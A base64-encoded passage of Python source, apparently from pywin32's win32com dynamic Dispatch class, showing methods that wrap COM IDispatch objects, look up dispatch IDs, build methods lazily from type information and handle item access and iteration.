CAgICAgICB0cnk6XG4gICAgICAgICAgICBpbnZraW5kID0gcHl0aG9uY29tLkRJU1BBVENIX01FVEhPRCB8IHB5dGhvbmNvbS5ESVNQQVRDSF9QUk9QRVJUWUdFVFxuICAgICAgICAgICAgZW51bSA9IHNlbGYuX29sZW9ial8uSW52b2tlVHlwZXMoXG4gICAgICAgICAgICAgICAgcHl0aG9uY29tLkRJU1BJRF9ORVdFTlVNLCBMQ0lELCBpbnZraW5kLCAoMTMsIDEwKSwgKClcbiAgICAgICAgICAgIClcbiAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5jb21fZXJyb3I6XG4gICAgICAgICAgICByZXR1cm4gTm9uZSAgIyBubyBlbnVtZXJhdG9yIGZvciB0aGlzIG9iamVjdC5cbiAgICAgICAgZnJvbSAuIGltcG9ydCB1dGlsXG5cbiAgICAgICAgcmV0dXJuIHV0aWwuV3JhcEVudW0oZW51bSwgTm9uZSlcblxuICAgIGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBpbmRleCk6ICAjIHN5dmVyIG1vZGlmaWVkXG4gICAgICAgICMgSW1wcm92ZWQgX19nZXRpdGVtX18gY291cnRlc3kgU3l2ZXIgRW5zdGFkXG4gICAgICAgICMgTXVzdCBjaGVjayBfTmV3RW51bSBiZWZvcmUgSXRlbSwgdG8gZW5zdXJlIGIvdyBjb21wYXQuXG4gICAgICAgIGlmIGlzaW5zdGFuY2UoaW5kZXgsIGludCk6XG4gICAgICAgICAgICBpZiBzZWxmLl9fZGljdF9fWyJfZW51bV8iXSBpcyBOb25lOlxuICAgICAgICAgICAgICAgIHNlbGYuX19kaWN0X19bIl9lbnVtXyJdID0gc2VsZi5fTmV3RW51bSgpXG4gICAgICAgICAgICBpZiBzZWxmLl9fZGljdF9fWyJfZW51bV8iXSBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgICAgICByZXR1cm4gc2VsZi5fZ2V0X2dvb2Rfb2JqZWN0XyhzZWxmLl9lbnVtXy5fX2dldGl0ZW1fXyhpbmRleCkpXG4gICAgICAgICMgU2VlIGlmIHdlIGhhdmUgYW4gIkl0ZW0iIG1ldGhvZC9wcm9wZXJ0eSB3ZSBjYW4gdXNlIChnb2VzIGhhbmQgaW4gaGFuZCB3aXRoIENvdW50KCkgYWJvdmUhKVxuICAgICAgICBpbnZraW5kLCBkaXNwaWQgPSBzZWxmLl9maW5kX2Rpc3BhdGNoX3R5cGVfKCJJdGVtIilcbiAgICAgICAgaWYgaW52a2luZCBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9nZXRfZ29vZF9vYmplY3RfKFxuICAgICAgICAgICAgICAgIHNlbGYuX29sZW9ial8uSW52b2tlKGRpc3BpZCwgTENJRCwgaW52a2luZCwgMSwgaW5kZXgpXG4gICAgICAgICAgICApXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcigiVGhpcyBvYmplY3QgZG9lcyBub3Qgc3VwcG9ydCBlbnVtZXJhdGlvbiIpXG5cbiAgICBkZWYgX19zZXRpdGVtX18oc2VsZiwgaW5kZXgsICphcmdzKTpcbiAgICAgICAgIyBYWFggLSB0b2RvIC0gV2Ugc2hvdWxkIHN1cHBvcnQgY2FsbGluZyBJdGVtKCkgaGVyZSB0b28hXG4gICAgICAgICMgXHRcdHByaW50ICJfX3NldGl0ZW1fXyB3aXRoIiwgaW5kZXgsIGFyZ3NcbiAgICAgICAgaWYgc2VsZi5fb2xlcmVwcl8uZGVmYXVsdERpc3BhdGNoTmFtZTpcbiAgICAgICAgICAgIGludmtpbmQsIGRpc3BpZCA9IHNlbGYuX2ZpbmRfZGlzcGF0Y2hfdHlwZV8oXG4gICAgICAgICAgICAgICAgc2VsZi5fb2xlcmVwcl8uZGVmYXVsdERpc3BhdGNoTmFtZVxuICAgICAgICAgICAgKVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgaW52a2luZCwgZGlzcGlkID0gKFxuICAgICAgICAgICAgICAgIHB5dGhvbmNvbS5ESVNQQVRDSF9QUk9QRVJUWVBVVCB8IHB5dGhvbmNvbS5ESVNQQVRDSF9QUk9QRVJUWVBVVFJFRixcbiAgICAgICAgICAgICAgICBweXRob25jb20uRElTUElEX1ZBTFVFLFxuICAgICAgICAgICAgKVxuICAgICAgICBpZiBpbnZraW5kIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgYWxsQXJncyA9IChkaXNwaWQsIExDSUQsIGludmtpbmQsIDAsIGluZGV4KSArIGFyZ3NcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9nZXRfZ29vZF9vYmplY3RfKFxuICAgICAgICAgICAgICAgIHNlbGYuX29sZW9ial8uSW52b2tlKCphbGxBcmdzKSwgc2VsZi5fb2xlcmVwcl8uZGVmYXVsdERpc3BhdGNoTmFtZSwgTm9uZVxuICAgICAgICAgICAgKVxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoIlRoaXMgZGlzcGF0Y2ggb2JqZWN0IGRvZXMgbm90IGRlZmluZSBhIGRlZmF1bHQgbWV0aG9kIilcblxuICAgIGRlZiBfZmluZF9kaXNwYXRjaF90eXBlXyhzZWxmLCBtZXRob2ROYW1lKTpcbiAgICAgICAgaWYgbWV0aG9kTmFtZSBpbiBzZWxmLl9vbGVyZXByXy5tYXBGdW5jczpcbiAgICAgICAgICAgIGl0ZW0gPSBzZWxmLl9vbGVyZXByXy5tYXBGdW5jc1ttZXRob2ROYW1lXVxuICAgICAgICAgICAgcmV0dXJuIGl0ZW0uZGVzY1s0XSwgaXRlbS5kaXNwaWRcblxuICAgICAgICBpZiBtZXRob2ROYW1lIGluIHNlbGYuX29sZXJlcHJfLnByb3BNYXBHZXQ6XG4gICAgICAgICAgICBpdGVtID0gc2VsZi5fb2xlcmVwcl8ucHJvcE1hcEdldFttZXRob2ROYW1lXVxuICAgICAgICAgICAgcmV0dXJuIGl0ZW0uZGVzY1s0XSwgaXRlbS5kaXNwaWRcblxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBkaXNwaWQgPSBzZWxmLl9vbGVvYmpfLkdldElEc09mTmFtZXMoMCwgbWV0aG9kTmFtZSlcbiAgICAgICAgZXhjZXB0OiAgIyMjIHdoYXQgZXJyb3I/XG4gICAgICAgICAgICByZXR1cm4gTm9uZSwgTm9uZVxuICAgICAgICByZXR1cm4gcHl0aG9uY29tLkRJU1BBVENIX01FVEhPRCB8IHB5dGhvbmNvbS5ESVNQQVRDSF9QUk9QRVJUWUdFVCwgZGlzcGlkXG5cbiAgICBkZWYgX0FwcGx5VHlwZXNfKHNlbGYsIGRpc3BpZCwgd0ZsYWdzLCByZXRUeXBlLCBhcmdUeXBlcywgdXNlciwgcmVzdWx0Q0xTSUQsICphcmdzKTpcbiAgICAgICAgcmVzdWx0ID0gc2VsZi5fb2xlb2JqXy5JbnZva2VUeXBlcyhcbiAgICAgICAgICAgICooZGlzcGlkLCBMQ0lELCB3RmxhZ3MsIHJldFR5cGUsIGFyZ1R5cGVzKSArIGFyZ3NcbiAgICAgICAgKVxuICAgICAgICByZXR1cm4gc2VsZi5fZ2V0X2dvb2Rfb2JqZWN0XyhyZXN1bHQsIHVzZXIsIHJlc3VsdENMU0lEKVxuXG4gICAgZGVmIF93cmFwX2Rpc3BhdGNoXyhcbiAgICAgICAgc2VsZiwgb2IsIHVzZXJOYW1lPU5vbmUsIHJldHVybkNMU0lEPU5vbmUsIFVuaWNvZGVUb1N0cmluZz1Ob25lXG4gICAgKTpcbiAgICAgICAgIyBHaXZlbiBhIGRpc3BhdGNoIG9iamVjdCwgd3JhcCBpdCBpbiBhIGNsYXNzXG4gICAgICAgIGFzc2VydCBVbmljb2RlVG9TdHJpbmcgaXMgTm9uZSwgInRoaXMgaXMgZGVwcmVjYXRlZCBhbmQgd2lsbCBnbyBhd2F5IlxuICAgICAgICByZXR1cm4gRGlzcGF0Y2gob2IsIHVzZXJOYW1lKVxuXG4gICAgZGVmIF9nZXRfZ29vZF9zaW5nbGVfb2JqZWN0XyhzZWxmLCBvYiwgdXNlck5hbWU9Tm9uZSwgUmV0dXJuQ0xTSUQ9Tm9uZSk6XG4gICAgICAgIGlmIGlzaW5zdGFuY2Uob2IsIFB5SURpc3BhdGNoVHlwZSk6XG4gICAgICAgICAgICAjIG1ha2UgYSBuZXcgaW5zdGFuY2Ugb2YgKHByb2JhYmx5IHRoaXMpIGNsYXNzLlxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX3dyYXBfZGlzcGF0Y2hfKG9iLCB1c2VyTmFtZSwgUmV0dXJuQ0xTSUQpXG4gICAgICAgIGlmIGlzaW5zdGFuY2Uob2IsIFB5SVVua25vd25UeXBlKTpcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBvYiA9IG9iLlF1ZXJ5SW50ZXJmYWNlKHB5dGhvbmNvbS5JSURfSURpc3BhdGNoKVxuICAgICAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5jb21fZXJyb3I6XG4gICAgICAgICAgICAgICAgIyBJdCBpcyBhbiBJVW5rbm93biwgYnV0IG5vdCBhbiBJRGlzcGF0Y2gsIHNvIGp1c3QgbGV0IGl0IHRocm91Z2guXG4gICAgICAgICAgICAgICAgcmV0dXJuIG9iXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fd3JhcF9kaXNwYXRjaF8ob2IsIHVzZXJOYW1lLCBSZXR1cm5DTFNJRClcbiAgICAgICAgcmV0dXJuIG9iXG5cbiAgICBkZWYgX2dldF9nb29kX29iamVjdF8oc2VsZiwgb2IsIHVzZXJOYW1lPU5vbmUsIFJldHVybkNMU0lEPU5vbmUpOlxuICAgICAgICAiIiJHaXZlbiBhbiBvYmplY3QgKHVzdWFsbHkgdGhlIHJldHZhbCBmcm9tIGEgbWV0aG9kKSwgbWFrZSBpdCBhIGdvb2Qgb2JqZWN0IHRvIHJldHVybi5cbiAgICAgICAgQmFzaWNhbGx5IGNoZWNrcyBpZiBpdCBpcyBhIENPTSBvYmplY3QsIGFuZCB3cmFwcyBpdCB1cC5cbiAgICAgICAgQWxzbyBoYW5kbGVzIHRoZSBmYWN0IHRoYXQgYSByZXR2YWwgbWF5IGJlIGEgdHVwbGUgb2YgcmV0dmFscyIiIlxuICAgICAgICBpZiBvYiBpcyBOb25lOiAgIyBRdWljayBleGl0IVxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKG9iLCB0dXBsZSk6XG4gICAgICAgICAgICByZXR1cm4gdHVwbGUoXG4gICAgICAgICAgICAgICAgbWFwKFxuICAgICAgICAgICAgICAgICAgICBsYW1iZGEgbywgcz1zZWxmLCBvdW49dXNlck5hbWUsIHJjPVJldHVybkNMU0lEOiBzLl9nZXRfZ29vZF9zaW5nbGVfb2JqZWN0XyhcbiAgICAgICAgICAgICAgICAgICAgICAgIG8sIG91biwgcmNcbiAgICAgICAgICAgICAgICAgICAgKSxcbiAgICAgICAgICAgICAgICAgICAgb2IsXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgKVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2dldF9nb29kX3NpbmdsZV9vYmplY3RfKG9iKVxuXG4gICAgZGVmIF9tYWtlX21ldGhvZF8oc2VsZiwgbmFtZSk6XG4gICAgICAgICJNYWtlIGEgbWV0aG9kIG9iamVjdCAtIEFzc3VtZXMgaW4gb2xlcmVwciBmdW5jbWFwIlxuICAgICAgICBtZXRob2ROYW1lID0gYnVpbGQuTWFrZVB1YmxpY0F0dHJpYnV0ZU5hbWUobmFtZSkgICMgdHJhbnNsYXRlIGtleXdvcmRzIGV0Yy5cbiAgICAgICAgbWV0aG9kQ29kZUxpc3QgPSBzZWxmLl9vbGVyZXByXy5NYWtlRnVuY01ldGhvZChcbiAgICAgICAgICAgIHNlbGYuX29sZXJlcHJfLm1hcEZ1bmNzW25hbWVdLCBtZXRob2ROYW1lLCAwXG4gICAgICAgIClcbiAgICAgICAgbWV0aG9kQ29kZSA9ICJcXG4iLmpvaW4obWV0aG9kQ29kZUxpc3QpXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgICMgXHRcdFx0cHJpbnQgIk1ldGhvZCBjb2RlIGZvciAlcyBpczpcXG4iICUgc2VsZi5fdXNlcm5hbWVfLCBtZXRob2RDb2RlXG4gICAgICAgICAgICAjIFx0XHRcdHNlbGYuX3ByaW50X2RldGFpbHNfKClcbiAgICAgICAgICAgIGNvZGVPYmplY3QgPSBjb21waWxlKG1ldGhvZENvZGUsICI8Q09NT2JqZWN0ICVzPiIgJSBzZWxmLl91c2VybmFtZV8sICJleGVjIilcbiAgICAgICAgICAgICMgRXhlYyB0aGUgY29kZSBvYmplY3RcbiAgICAgICAgICAgIHRlbXBOYW1lU3BhY2UgPSB7fVxuICAgICAgICAgICAgIyAiRGlzcGF0Y2giIGluIHRoZSBleGVjXCdkIGNvZGUgaXMgd2luMzJjb20uY2xpZW50LkRpc3BhdGNoLCBub3Qgb3Vycy5cbiAgICAgICAgICAgIGdsb2JOYW1lU3BhY2UgPSBnbG9iYWxzKCkuY29weSgpXG4gICAgICAgICAgICBnbG9iTmFtZVNwYWNlWyJEaXNwYXRjaCJdID0gd2luMzJjb20uY2xpZW50LkRpc3BhdGNoXG4gICAgICAgICAgICBleGVjKFxuICAgICAgICAgICAgICAgIGNvZGVPYmplY3QsIGdsb2JOYW1lU3BhY2UsIHRlbXBOYW1lU3BhY2VcbiAgICAgICAgICAgICkgICMgc2VsZi5fX2RpY3RfXywgc2VsZi5fX2RpY3RfX1xuICAgICAgICAgICAgbmFtZSA9IG1ldGhvZE5hbWVcbiAgICAgICAgICAgICMgU2F2ZSB0aGUgZnVuY3Rpb24gaW4gbWFwLlxuICAgICAgICAgICAgZm4gPSBzZWxmLl9idWlsdE1ldGhvZHNfW25hbWVdID0gdGVtcE5hbWVTcGFjZVtuYW1lXVxuICAgICAgICAgICAgbmV3TWV0aCA9IE1ha2VNZXRob2QoZm4sIHNlbGYsIHNlbGYuX19jbGFzc19fKVxuICAgICAgICAgICAgcmV0dXJuIG5ld01ldGhcbiAgICAgICAgZXhjZXB0OlxuICAgICAgICAgICAgZGVidWdfcHJpbnQoIkVycm9yIGJ1aWxkaW5nIE9MRSBkZWZpbml0aW9uIGZvciBjb2RlICIsIG1ldGhvZENvZGUpXG4gICAgICAgICAgICB0cmFjZWJhY2sucHJpbnRfZXhjKClcbiAgICAgICAgcmV0dXJuIE5vbmVcblxuICAgIGRlZiBfUmVsZWFzZV8oc2VsZik6XG4gICAgICAgICIiIkNsZWFudXAgb2JqZWN0IC0gbGlrZSBhIGNsb3NlIC0gdG8gZm9yY2UgY2xlYW51cCB3aGVuIHlvdSBkb250XG4gICAgICAgIHdhbnQgdG8gcmVseSBvbiBQeXRob25cJ3MgcmVmZXJlbmNlIGNvdW50aW5nLiIiIlxuICAgICAgICBmb3IgY2hpbGRDb250IGluIHNlbGYuX21hcENhY2hlZEl0ZW1zXy52YWx1ZXMoKTpcbiAgICAgICAgICAgIGNoaWxkQ29udC5fUmVsZWFzZV8oKVxuICAgICAgICBzZWxmLl9tYXBDYWNoZWRJdGVtc18gPSB7fVxuICAgICAgICBpZiBzZWxmLl9vbGVvYmpfOlxuICAgICAgICAgICAgc2VsZi5fb2xlb2JqXy5SZWxlYXNlKClcbiAgICAgICAgICAgIHNlbGYuX19kaWN0X19bIl9vbGVvYmpfIl0gPSBOb25lXG4gICAgICAgIGlmIHNlbGYuX29sZXJlcHJfOlxuICAgICAgICAgICAgc2VsZi5fX2RpY3RfX1siX29sZXJlcHJfIl0gPSBOb25lXG4gICAgICAgIHNlbGYuX2VudW1fID0gTm9uZVxuXG4gICAgZGVmIF9wcm9jXyhzZWxmLCBuYW1lLCAqYXJncyk6XG4gICAgICAgICIiIkNhbGwgdGhlIG5hbWVkIG1ldGhvZCBhcyBhIHByb2NlZHVyZSwgcmF0aGVyIHRoYW4gZnVuY3Rpb24uXG4gICAgICAgIE1haW5seSB1c2VkIGJ5IFdvcmQuQmFzaWMsIHdoaWNoIHdoaW5nZXMgYWJvdXQgc3VjaCB0aGluZ3MuIiIiXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGl0ZW0gPSBzZWxmLl9vbGVyZXByXy5tYXBGdW5jc1tuYW1lXVxuICAgICAgICAgICAgZGlzcElkID0gaXRlbS5kaXNwaWRcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9nZXRfZ29vZF9vYmplY3RfKFxuICAgICAgICAgICAgICAgIHNlbGYuX29sZW9ial8uSW52b2tlKCooZGlzcElkLCBMQ0lELCBpdGVtLmRlc2NbNF0sIDApICsgKGFyZ3MpKVxuICAgICAgICAgICAgKVxuICAgICAgICBleGNlcHQgS2V5RXJyb3I6XG4gICAgICAgICAgICByYWlzZSBBdHRyaWJ1dGVFcnJvcihuYW1lKVxuXG4gICAgZGVmIF9wcmludF9kZXRhaWxzXyhzZWxmKTpcbiAgICAgICAgIkRlYnVnIHJvdXRpbmUgLSBkdW1wcyB3aGF0IGl0IGtub3dzIGFib3V0IGFuIG9iamVjdC4iXG4gICAgICAgIHByaW50KCJBeERpc3BhdGNoIGNvbnRhaW5lciIsIHNlbGYuX3VzZXJuYW1lXylcbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgcHJpbnQoIk1ldGhvZHM6IilcbiAgICAgICAgICAgIGZvciBtZXRob2QgaW4gc2VsZi5fb2xlcmVwcl8ubWFwRnVuY3Mua2V5cygpOlxuICAgICAgICAgICAgICAgIHByaW50KCJcXHQiLCBtZXRob2QpXG4gICAgICAgICAgICBwcmludCgiUHJvcHM6IilcbiAgICAgICAgICAgIGZvciBwcm9wLCBlbnRyeSBpbiBzZWxmLl9vbGVyZXByXy5wcm9wTWFwLml0ZW1zKCk6XG4gICAgICAgICAgICAgICAgcHJpbnQoIlxcdCVzID0gMHgleCAtICVzIiAlIChwcm9wLCBlbnRyeS5kaXNwaWQsIHJlcHIoZW50cnkpKSlcbiAgICAgICAgICAgIHByaW50KCJHZXQgUHJvcHM6IilcbiAgICAgICAgICAgIGZvciBwcm9wLCBlbnRyeSBpbiBzZWxmLl9vbGVyZXByXy5wcm9wTWFwR2V0Lml0ZW1zKCk6XG4gICAgICAgICAgICAgICAgcHJpbnQoIlxcdCVzID0gMHgleCAtICVzIiAlIChwcm9wLCBlbnRyeS5kaXNwaWQsIHJlcHIoZW50cnkpKSlcbiAgICAgICAgICAgIHByaW50KCJQdXQgUHJvcHM6IilcbiAgICAgICAgICAgIGZvciBwcm9wLCBlbnRyeSBpbiBzZWxmLl9vbGVyZXByXy5wcm9wTWFwUHV0Lml0ZW1zKCk6XG4gICAgICAgICAgICAgICAgcHJpbnQoIlxcdCVzID0gMHgleCAtICVzIiAlIChwcm9wLCBlbnRyeS5kaXNwaWQsIHJlcHIoZW50cnkpKSlcbiAgICAgICAgZXhjZXB0OlxuICAgICAgICAgICAgdHJhY2ViYWNrLnByaW50X2V4YygpXG5cbiAgICBkZWYgX19MYXp5TWFwX18oc2VsZiwgYXR0cik6XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGlmIHNlbGYuX0xhenlBZGRBdHRyXyhhdHRyKTpcbiAgICAgICAgICAgICAgICBkZWJ1Z19hdHRyX3ByaW50KFxuICAgICAgICAgICAgICAgICAgICAiJXMuX19MYXp5TWFwX18oJXMpIGFkZGVkIHNvbWV0aGluZyIgJSAoc2VsZi5fdXNlcm5hbWVfLCBhdHRyKVxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICByZXR1cm4gMVxuICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6XG4gICAgICAgICAgICByZXR1cm4gMFxuXG4gICAgIyBVc2luZyB0aGUgdHlwZWNvbXAsIGxhemlseSBjcmVhdGUgYSBuZXcgYXR0cmlidXRlIGRlZmluaXRpb24uXG4gICAgZGVmIF9MYXp5QWRkQXR0cl8oc2VsZiwgYXR0cik6XG4gICAgICAgIGlmIHNlbGYuX2xhenlkYXRhXyBpcyBOb25lOlxuICAgICAgICAgICAgcmV0dXJuIDBcbiAgICAgICAgcmVzID0gMFxuICAgICAgICB0eXBlaW5mbywgdHlwZWNvbXAgPSBzZWxmLl9sYXp5ZGF0YV9cbiAgICAgICAgb2xlcmVwciA9IHNlbGYuX29sZXJlcHJfXG4gICAgICAgICMgV2UgbmVlZCB0byBleHBsaWNpdGx5IGNoZWNrIGVhY2ggaW52b2tlIHR5cGUgaW5kaXZpZHVhbGx5IC0gc2ltcGx5XG4gICAgICAgICMgc3BlY2lmeWluZyBcJzBcJyB3aWxsIGJpbmQgdG8gImFueSBtZW1iZXIiLCB3aGljaCBtYXkgbm90IGJlIHRoZSBvbmVcbiAgICAgICAgIyB3ZSBhcmUgYWN0dWFsbHkgYWZ0ZXIgKGllLCB3ZSBtYXkgYmUgYWZ0ZXIgcHJvcF9nZXQsIGJ1dCByZXR1cm5lZFxuICAgICAgICAjIHRoZSBpbmZvIGZvciB0aGUgcHJvcF9wdXQuKVxuICAgICAgICBmb3IgaSBpbiBBTExfSU5WT0tFX1RZUEVTOlxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIHgsIHQgPSB0eXBlY29tcC5CaW5kKGF0dHIsIGkpXG4gICAgICAgICAgICAgICAgIyBTdXBwb3J0IFwnR2V0XCcgYW5kIFwnU2V0XCcgcHJvcGVydGllcyAtIHNlZVxuICAgICAgICAgICAgICAgICMgYnVnIDE1ODcwMjNcbiAgICAgICAgICAgICAgICBpZiB4ID09IDAgYW5kIGF0dHJbOjNdIGluICgiU2V0IiwgIkdldCIpOlxuICAgICAgICAgICAgICAgICAgICB4LCB0ID0gdHlwZWNvbXAuQmluZChhdHRyWzM6XSwgaSlcbiAgICAgICAgICAgICAgICBpZiB4ID09IHB5dGhvbmNvbS5ERVNDS0lORF9GVU5DREVTQzogICMgaXRcJ3MgYSBGVU5DREVTQ1xuICAgICAgICAgICAgICAgICAgICByID0gb2xlcmVwci5fQWRkRnVuY18odHlwZWluZm8sIHQsIDApXG4gICAgICAgICAgICAgICAgZWxpZiB4ID09IHB5dGhvbmNvbS5ERVNDS0lORF9WQVJERVNDOiAgIyBpdFwncyBhIFZBUkRFU0NcbiAgICAgICAgICAgICAgICAgICAgciA9IG9sZXJlcHIuX0FkZFZhcl8odHlwZWluZm8sIHQsIDApXG4gICAgICAgICAgICAgICAgZWxzZTogICMgbm90IGZvdW5kIG9yIFRZUEVERVNDL0lNUExJQ0lUQVBQXG4gICAgICAgICAgICAgICAgICAgIHIgPSBOb25lXG4gICAgICAgICAgICAgICAgaWYgbm90IHIgaXMgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAga2V5LCBtYXAgPSByWzBdLCByWzFdXG4gICAgICAgICAgICAgICAgICAgIGl0ZW0gPSBtYXBba2V5XVxuICAgICAgICAgICAgICAgICAgICBpZiBtYXAgPT0gb2xlcmVwci5wcm9wTWFwUHV0OlxuICAgICAgICAgICAgICAgICAgICAgICAgb2xlcmVwci5fcHJvcE1hcFB1dENoZWNrXyhrZXksIGl0ZW0pXG4gICAgICAgICAgICAgICAgICAgIGVsaWYgbWFwID09IG9sZXJlcHIucHJvcE1hcEdldDpcbiAgICAgICAgICAgICAgICAgICAgICAgIG9sZXJlcHIuX3Byb3BNYXBHZXRDaGVja18oa2V5LCBpdGVtKVxuICAgICAgICAgICAgICAgICAgICByZXMgPSAxXG4gICAgICAgICAgICBleGNlcHQ6XG4gICAgICAgICAgICAgICAgcGFzc1xuICAgICAgICByZXR1cm4gcmVzXG5cbiAgICBkZWYgX0ZsYWdBc01ldGhvZChzZWxmLCAqbWV0aG9kTmFtZXMpOlxuICAgICAgICAiIiJGbGFnIHRoZXNlIGF0dHJpYnV0ZSBuYW1lcyBhcyBiZWluZyBtZXRob2RzLlxuICAgICAgICBTb21lIG9iamVjdHMgZG8gbm90IGNvcnJlY3RseSBkaWZmZXJlbnRpYXRlIG1ldGhvZHMgYW5kXG4gICAgICAgIHByb3BlcnRpZXMsIGxlYWRpbmcgdG8gcHJvYmxlbXMgd2hlbiBjYWxsaW5nIHRoZXNlIG1ldGhvZHMuXG5cbiAgICAgICAgU3BlY2lmaWNhbGx5LCB0cnlpbmcgdG8gc2F5OiBvYi5Tb21lRnVuYygpXG4gICAgICAgIG1heSB5aWVsZCBhbiBleGNlcHRpb24gIk5vbmUgb2JqZWN0IGlzIG5vdCBjYWxsYWJsZSJcbiAgICAgICAgSW4gdGhpcyBjYXNlLCBhbiBhdHRlbXB0IHRvIGZldGNoIHRoZSAqcHJvcGVydHkqIGhhcyB3b3JrZWRcbiAgICAgICAgYW5kIHJldHVybmVkIE5vbmUsIHJhdGhlciB0aGFuIGluZGljYXRpbmcgaXQgaXMgcmVhbGx5IGEgbWV0aG9kLlxuICAgICAgICBDYWxsaW5nOiBvYi5fRmxhZ0FzTWV0aG9kKCJTb21lRnVuYyIpXG4gICAgICAgIHNob3VsZCB0aGVuIGFsbG93IHRoaXMgdG8gd29yay5cbiAgICAgICAgIiIiXG4gICAgICAgIGZvciBuYW1lIGluIG1ldGhvZE5hbWVzOlxuICAgICAgICAgICAgZGV0YWlscyA9IGJ1aWxkLk1hcEVudHJ5KHNlbGYuX19BdHRyVG9JRF9fKG5hbWUpLCAobmFtZSwpKVxuICAgICAgICAgICAgc2VsZi5fb2xlcmVwcl8ubWFwRnVuY3NbbmFtZV0gPSBkZXRhaWxzXG5cbiAgICBkZWYgX19BdHRyVG9JRF9fKHNlbGYsIGF0dHIpOlxuICAgICAgICBkZWJ1Z19hdHRyX3ByaW50KFxuICAgICAgICAgICAgIkNhbGxpbmcgR2V0SURzT2ZOYW1lcyBmb3IgcHJvcGVydHkgJXMgaW4gRGlzcGF0Y2ggY29udGFpbmVyICVzIlxuICAgICAgICAgICAgJSAoYXR0ciwgc2VsZi5fdXNlcm5hbWVfKVxuICAgICAgICApXG4gICAgICAgIHJldHVybiBzZWxmLl9vbGVvYmpfLkdldElEc09mTmFtZXMoMCwgYXR0cilcblxuICAgIGRlZiBfX2dldGF0dHJfXyhzZWxmLCBhdHRyKTpcbiAgICAgICAgaWYgYXR0ciA9PSAiX19pdGVyX18iOlxuICAgICAgICAgICAgIyBXZSBjYW5cJ3QgaGFuZGxlIHRoaXMgYXMgYSBub3JtYWwgbWV0aG9kLCBhcyBpZiB0aGUgYXR0cmlidXRlXG4gICAgICAgICAgICAjIGV4aXN0cywgdGhlbiBpdCBtdXN0IHJldHVybiBhbiBpdGVyYWJsZSBvYmplY3QuXG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgaW52a2luZCA9IHB5dGhvbmNvbS5ESVNQQVRDSF9NRVRIT0QgfCBweXRob25jb20uRElTUEFUQ0hfUFJPUEVSVFlHRVRcbiAgICAgICAgICAgICAgICBlbnVtID0gc2VsZi5fb2xlb2JqXy5JbnZva2VUeXBlcyhcbiAgICAgICAgICAgICAgICAgICAgcHl0aG9uY29tLkRJU1BJRF9ORVdFTlVNLCBMQ0lELCBpbnZraW5kLCAoMTMsIDEwKSwgKClcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjpcbiAgICAgICAgICAgICAgICByYWlzZSBBdHRyaWJ1dGVFcnJvcigiVGhpcyBvYmplY3QgY2FuIG5vdCBmdW5jdGlvbiBhcyBhbiBpdGVyYXRvciIpXG4gICAgICAgICAgICAjIFdlIG11c3QgcmV0dXJuIGEgY2FsbGFibGUgb2JqZWN0LlxuICAgICAgICAgICAgY2xhc3MgRmFjdG9yeTpcbiAgICAgICAgICAgICAgICBkZWYgX19pbml0X18oc2VsZiwgb2IpOlxuICAgICAgICAgICAgICAgICAgICBzZWxmLm9iID0gb2JcblxuICAgICAgICAgICAgICAgIGRlZiBfX2NhbGxfXyhzZWxmKTpcbiAgICAgICAgICAgICAgICAgICAgaW1wb3J0IHdpbjMyY29tLmNsaWVudC51dGlsXG5cbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHdpbjMyY29tLmNsaWVudC51dGlsLkl0ZXJhdG9yKHNlbGYub2IpXG5cbiAgICAgICAgICAgIHJldHVybiBGYWN0b3J5KGVudW0pXG5cbiAgICAgICAgaWYgYXR0ci5zdGFydHN3aXRoKCJfIikgYW5kIGF0dHIuZW5kc3dpdGgoIl8iKTogICMgRmFzdC10cmFjay5cbiAgICAgICAgICAgIHJhaXNlIEF0dHJpYnV0ZUVycm9yKGF0dHIpXG4gICAgICAgICMgSWYgYSBrbm93biBtZXRob2QsIGNyZWF0ZSBuZXcgaW5zdGFuY2UgYW5kIHJldHVybi5cbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgcmV0dXJuIE1ha2VNZXRob2Qoc2VsZi5fYnVpbHRNZXRob2RzX1thdHRyXSwgc2VsZiwgc2VsZi5fX2NsYXNzX18pXG4gICAgICAgIGV4Y2VwdCBLZXlFcnJvcjpcbiAgICAgICAgICAgIHBhc3NcbiAgICAgICAgIyBYWFggLSBOb3RlIHRoYXQgd2UgY3VycmVudCBhcmUgY2FzZSBzZW5zaXRpdmUgaW4gdGhlIG1ldGhvZC5cbiAgICAgICAgIyBkZWJ1Z19hdHRyX3ByaW50KCJHZXRBdHRyIGNhbGxlZCBmb3IgJXMgb24gRGlzcGF0Y2hDb250YWluZXIgJXMiICUgKGF0dHIsc2VsZi5fdXNlcm5hbWVfKSlcbiAgICAgICAgIyBGaXJzdCBjaGVjayBpZiBpdCBpcyBpbiB0aGUgbWV0aG9kIG1hcC4gIE5vdGUgdGhhdCBhbiBhY3R1